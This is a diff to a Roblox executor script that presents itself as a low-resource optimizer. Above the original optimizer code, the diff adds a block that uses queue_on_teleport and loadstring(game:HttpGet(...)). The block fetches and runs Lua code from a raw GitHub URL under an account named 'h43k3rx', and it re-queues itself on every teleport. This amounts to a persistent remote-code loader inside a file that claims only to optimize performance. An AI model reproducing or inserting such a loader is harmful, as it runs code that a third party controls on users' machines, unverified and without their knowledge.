@@ -4,6 +4,47 @@
 -- Single-file Roblox LocalScript / Executor script
 --==================================================
 
+--==================================================
+-- AUTO RUN + RE-QUEUE AFTER EVERY TELEPORT
+--==================================================
+
+local SCRIPT_URL =
+    "https://raw.githubusercontent.com/h43k3rx/erm/refs/heads/main/main.lua"
+
+local QueueFunction = queue_on_teleport or queueonteleport
+
+if type(QueueFunction) == "function" then
+    local queuedCode = string.format([[
+        repeat
+            task.wait()
+        until game:IsLoaded()
+
+        local success, err = pcall(function()
+            loadstring(game:HttpGet(%q))()
+        end)
+
+        if not success then
+            warn("[LowResource] Auto-run failed:", err)
+        end
+    ]], SCRIPT_URL)
+
+    local success, err = pcall(function()
+        QueueFunction(queuedCode)
+    end)
+
+    if success then
+        print("[LowResource] Queued for next server")
+    else
+        warn("[LowResource] Queue failed:", err)
+    end
+else
+    warn("[LowResource] queue_on_teleport is unavailable")
+end
+
+--==================================================
+-- ORIGINAL OPTIMIZER
+--==================================================
+
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
